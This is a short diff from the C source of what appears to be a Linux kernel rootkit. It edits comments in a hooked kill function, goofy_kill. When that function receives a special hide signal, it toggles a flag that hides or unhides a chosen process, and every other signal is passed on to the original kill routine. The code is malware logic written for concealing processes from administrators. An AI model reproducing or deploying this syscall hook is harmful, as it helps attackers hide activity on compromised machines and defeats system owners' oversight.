@@ -257,19 +257,18 @@ int is_hidden_proc(pid_t pid){
  * @return int on success return 0 otherwise -1
  */
 int goofy_kill(pid_t pid, int sig){
-	//printk("[goof] goofy_kill\n");
-	/*FAULT - invalid opcode - Relative jump is wreking everything :(
-		waiting for LDE+ to be finished to implement in-line hooking
-		*/
+	//Create og function pointer
 	int (*func_ptr)(pid_t, int) = (void *)hooks[2]->trampoline;
 	struct task_struct *res;
+	//Check if signal is hiding signal
 	if(sig == HIDE_SIG){
-		//pid_task(find_vpid(pid), PIDTYPE_PID); --- doesn't work b/c we're not GPL
+		//Find process
 		res = find_task(pid);
 		//XOR allows us to hide and unhide the process
 		res->flags ^= HIDDEN;
 		return 0;
 	}
+	// Else execute original code
 	int ret = func_ptr(pid, sig); //original_kill(pid, sig);
 	return ret;
 }
